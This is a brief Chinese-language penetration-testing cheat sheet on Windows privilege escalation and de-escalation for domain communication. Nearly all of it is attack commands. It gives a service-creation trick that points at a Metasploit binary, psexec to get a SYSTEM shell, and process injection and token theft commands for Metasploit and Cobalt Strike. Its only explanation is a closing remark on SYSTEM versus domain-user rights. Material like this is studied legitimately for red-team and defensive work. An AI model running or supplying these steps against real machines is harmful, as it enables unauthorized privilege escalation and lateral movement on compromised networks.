# 计算机用户权限提升(与内网同通讯)
# 服务启动(提权)
适用:win7,10,08,12,16,19,22
1.创建syscmd的执行文件服务
sc Create syscmd binPath= "c:\msf.exe"
sc start system
# 远程控制(psexec,提权)
提权
psexec.exe -accepteula -s -i -d cmd#system调用运行cmd
# 进程注入(降权&提权)
- msf:
ps
migrate pid
- CS:
ps
inject pid

# 令牌窃取(降权&提权)
- msf:
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY/SYSTEM"
- cs:
ps
steal_token pid//窃取令牌
spawnu//窃取令牌上线

msf的getsystem将自动实行以上方法


提权到system能与域通信
降权到普通用户(域用户)通信
<mark>
理解:普通用户(域用户)受AD管理,system权限能不受AD限制,那么本机的administrator权限可以选择提权或降权与域通信
</mark>